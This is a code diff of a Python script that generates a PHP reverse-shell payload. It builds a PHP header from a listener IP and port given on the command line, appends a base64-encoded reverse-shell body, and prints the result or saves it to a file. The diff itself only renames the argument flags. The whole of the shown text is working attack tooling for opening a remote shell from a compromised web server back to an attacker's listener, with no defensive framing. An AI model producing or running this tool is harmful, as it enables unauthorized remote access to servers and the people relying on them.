@@ -8,17 +8,17 @@ PAYLOAD = "JGNodW5rX3NpemU9MTQwMDskd3JpdGVfYT1udWxsOyRlcnJvcl9hPW51bGw7JHNoZWxsP
 
 def main():
     parser = argparse.ArgumentParser()
-    parser.add_argument("IP_ADDRESS", help="IP Address of Local Listener")
-    parser.add_argument("PORT", help="Port number of Local Listener", type=int,)
-    parser.add_argument("-s", "--file", help="Save the generated payload into a file")
+    parser.add_argument("-ip", help="IP Address of Local Listener", required=True)
+    parser.add_argument("-p", "--port", help="Port number of Local Listener", type=int, required=True)
+    parser.add_argument("-o", "--output", help="Save the generated payload into a file")
     args = parser.parse_args()
-    PL = ("<?php set_time_limit(0);$ip='{}';$port={};".format(args.IP_ADDRESS, args.PORT)).encode('ascii')
+    PL = ("<?php set_time_limit(0);$ip='{}';$port={};".format(args.ip, args.port)).encode('ascii')
     PLS = base64.b64encode(PL)
     PLE = PAYLOAD.encode('ascii')
-    if args.file:
-        file = open(args.file, "w")
+    if args.output:
+        file = open(args.output, "w")
         file.write("{}{}".format(base64.b64decode(PLS).decode('ascii'),base64.b64decode(PLE).decode('ascii')).rstrip("\n"))
-        print("[+] Payload Stored on \"{}\"".format(args.file))
+        print("[+] Payload Stored on \"{}\"".format(args.output))
         file.close()
     else:
         print("{}{}".format(base64.b64decode(PLS).decode('ascii'),base64.b64decode(PLE).decode('ascii')).rstrip("\n"))
